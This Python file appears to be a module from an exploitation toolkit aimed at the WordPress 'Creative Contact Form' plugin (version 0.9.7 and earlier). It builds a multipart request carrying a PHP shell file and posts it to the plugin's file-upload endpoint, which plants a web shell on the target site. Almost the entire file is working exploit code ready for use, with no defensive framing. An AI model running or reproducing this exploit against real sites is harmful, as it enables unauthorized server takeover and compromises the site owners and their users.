from exploits.exploitshell import ExploitShell


class CreativeContactFormShell(ExploitShell):
	@staticmethod
	def getname():
		return 'Creative Contact Form'

	@staticmethod
	def getversion():
		return '<= 0.9.7'

	@staticmethod
	def getexploiturl():
		return 'http://www.exploit-db.com/exploits/35057/'

	def getexploit(self):
		getfields = dict()
		payloadname = self.checkfile('extras/shell.php')
		payloadcontent = open(payloadname).read()

		LIMIT = '----------lImIt_of_THE_fIle_eW_$'
		CRLF = '\r\n'

		L = []
		for (key, value) in getfields.items():
			L.append('--' + LIMIT)
			L.append('Content-Disposition: form-data; name="%s"' % key)
			L.append('')
			L.append(value)

		L.append('--' + LIMIT)
		L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', payloadname))
		L.append('Content-Type: application/octet-stream')
		L.append('')
		L.append(payloadcontent)
		L.append('--' + LIMIT + '--')
		L.append('')
		body = CRLF.join(L)

		return body

	def exploit(self):
		name = self.getname()
		version = self.getversion()
		exploit = self.getexploit()
		url = self.hostname + '/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php'

		headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
			'content-type': 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$',
			'content-length': str(len(exploit))}

		response = self.request(url, data=exploit, headers=headers, method='POST')

		if response is None or "error" in response or response == '0':
			ExploitShell.exploitnotfound(name, version)
		else:
			ExploitShell.exploitfound(name, version, self.getexploiturl())
